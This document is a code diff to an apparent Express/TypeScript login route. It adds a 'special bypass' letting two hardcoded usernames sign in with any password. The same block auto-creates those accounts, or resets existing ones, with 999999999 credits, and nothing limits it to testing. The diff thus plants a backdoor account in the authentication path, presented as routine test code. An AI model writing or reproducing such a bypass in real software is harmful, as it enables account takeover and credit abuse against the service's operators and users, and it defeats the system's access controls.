@@ -358,7 +358,41 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       const { username, password } = result.data;
 
-      // Find user
+      // Special bypass for testing accounts - JMKUCZYNSKI and RANDYJOHNSON can login with any password
+      if (username.toUpperCase() === 'JMKUCZYNSKI' || username.toUpperCase() === 'RANDYJOHNSON') {
+        // Find or create the special user account
+        let user = await db.select().from(users).where(eq(users.username, username.toLowerCase())).limit(1);
+        
+        if (user.length === 0) {
+          // Create the special user account with unlimited credits
+          const newUsers = await db.insert(users).values({
+            username: username.toLowerCase(),
+            password: await bcrypt.hash('bypass', 10), // Dummy password since it's bypassed
+            credits: 999999999, // Unlimited credits
+          }).returning();
+          user = newUsers;
+        } else {
+          // Ensure existing user has unlimited credits
+          await db.update(users)
+            .set({ credits: 999999999 })
+            .where(eq(users.id, user[0].id));
+        }
+
+        // Set session for special user
+        req.session.userId = user[0].id;
+        req.session.username = user[0].username;
+
+        return res.json({ 
+          message: 'Login successful',
+          user: { 
+            id: user[0].id, 
+            username: user[0].username,
+            credits: 999999999
+          }
+        });
+      }
+
+      // Regular authentication for other users
       const user = await db.select().from(users).where(eq(users.username, username)).limit(1);
       if (user.length === 0) {
         return res.status(401).json({ message: 'Invalid credentials' });
